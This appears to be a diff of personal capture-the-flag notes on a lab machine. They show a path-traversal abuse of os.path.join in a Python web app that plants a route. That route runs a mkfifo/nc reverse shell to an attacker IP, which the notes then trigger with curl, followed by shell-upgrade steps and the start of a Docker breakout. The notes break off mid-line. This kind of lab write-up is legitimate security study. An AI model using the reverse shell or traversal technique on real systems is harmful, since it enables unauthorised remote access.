@@ -43,7 +43,6 @@ whatweb http://<ip>
 >[!Example]- Result
 >![[Pasted image 20250226153021.png]]
 
-
 - The web allow us to download, what appears to be, que source code of the web application, so after reading the content we know:
 	- Web applicaction is deployed in a docker container
 	- User "root" is running the service
@@ -58,6 +57,9 @@ whatweb http://<ip>
 - looks like is replacement the string `../` in order to avoid path traversal
 >[!example]- Result
 >![[Pasted image 20250226160227.png]]
+
+# Docker Exploitation
+## Inicial Access
 
 - so we can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
 >[!info]- Like this:
@@ -75,6 +77,30 @@ def cmd():
     return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f")
 ```
 >[!example]- Result
->![[Pasted image 20250226161255.png]]
+>![[Pasted image 20250226162527.png]]
 
+- so if we research this new route `/shell` the python code while be executed
+```bash
+curl http://10.10.11.164/shell
+```
+>[!example]- Result
+>![[Pasted image 20250226162830.png]]
 
+- In order to get a better experience we can upgrade the tty using python (we use sh because there is no bash)
+```bash
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+ctrl + z
+stty raw echo; fg
+reset xterm
+export PS1="\u@\h:\w\# "
+export TERM=xterm-256color
+```
+> [!example]- Result
+> ![[Pasted image 20250226163759.png]]
+
+# Docker Breakout
+- we are inside a docker so lets get out of here
+>[!example]- Result
+>![[Pasted image 20250226164003.png]]
+## Enumeration
+- check 
